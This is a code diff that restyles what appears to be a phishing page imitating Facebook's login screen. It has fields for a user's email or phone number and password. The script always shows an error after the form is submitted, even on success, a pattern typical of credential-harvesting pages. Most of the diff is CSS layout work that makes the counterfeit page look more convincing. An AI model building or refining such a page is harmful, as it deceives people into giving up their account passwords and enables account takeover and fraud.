@@ -16,17 +16,26 @@
       background-color: #f0f2f5;
       display: flex;
       flex-direction: column;
-      align-items: center;
       min-height: 100vh;
       padding: 20px;
       position: relative;
     }
     
+    .content-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex-grow: 1;
+      justify-content: center; /* This centers the card vertically */
+      padding-top: 40px; /* Adds space above the card */
+    }
+    
     .logo {
-      margin: 40px 0 20px;
+      margin-bottom: 20px;
       color: #1877f2;
       font-size: 40px;
       font-weight: bold;
+      text-align: center;
     }
     
     .form-container {
@@ -100,10 +109,11 @@
     }
     
     .footer {
-      margin-top: 20px;
       text-align: center;
       color: #1c1e21;
       font-size: 14px;
+      margin-top: auto; /* Pushes footer to bottom */
+      padding: 20px 0;
     }
     
     .footer a {
@@ -116,9 +126,9 @@
     }
     
     .language-selector {
-      margin-top: 20px;
       font-size: 12px;
       color: #737373;
+      margin-top: 10px;
     }
     
     /* Error Popup Styles */
@@ -174,7 +184,6 @@
     
     @media (max-width: 480px) {
       .logo {
-        margin: 20px 0;
         font-size: 32px;
       }
       
@@ -187,36 +196,41 @@
       .login-btn {
         padding: 12px;
       }
+      
+      .content-wrapper {
+        padding-top: 20px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="logo">facebook</div>
-  
-  <div class="form-container">
-    <form id="form">
-      <div class="form-field">
-        <input type="text" name="identifier" id="identifier" placeholder="Mobile number or email address" />
-      </div>
+  <div class="content-wrapper">
+    <div class="logo">facebook</div>
+    
+    <div class="form-container">
+      <form id="form">
+        <div class="form-field">
+          <input type="text" name="identifier" id="identifier" placeholder="Mobile number or email address" />
+        </div>
 
-      <div class="form-field">
-        <input type="password" name="password" id="password" placeholder="Password" />
-      </div>
+        <div class="form-field">
+          <input type="password" name="password" id="password" placeholder="Password" />
+        </div>
 
-      <button type="submit" class="login-btn">Log In</button>
-      
-      <div class="divider"></div>
-      
-      <button type="button" class="create-account-btn">Create New Account</button>
-    </form>
+        <button type="submit" class="login-btn">Log In</button>
+        
+        <div class="divider"></div>
+        
+        <button type="button" class="create-account-btn">Create New Account</button>
+      </form>
+    </div>
   </div>
   
   <div class="footer">
     <a href="#">Forgotten password?</a>
-  </div>
-  
-  <div class="language-selector">
-    English (UK)
+    <div class="language-selector">
+      English (UK)
+    </div>
   </div>
 
   <!-- Error Popup -->
@@ -262,11 +276,11 @@
         .then(() => {
           btn.textContent = 'Log In';
           btn.disabled = false;
-          showError(); // Show error message instead of success
+          showError();
         }, (err) => {
           btn.textContent = 'Log In';
           btn.disabled = false;
-          showError(); // Show error message
+          showError();
         });
     });
   </script>
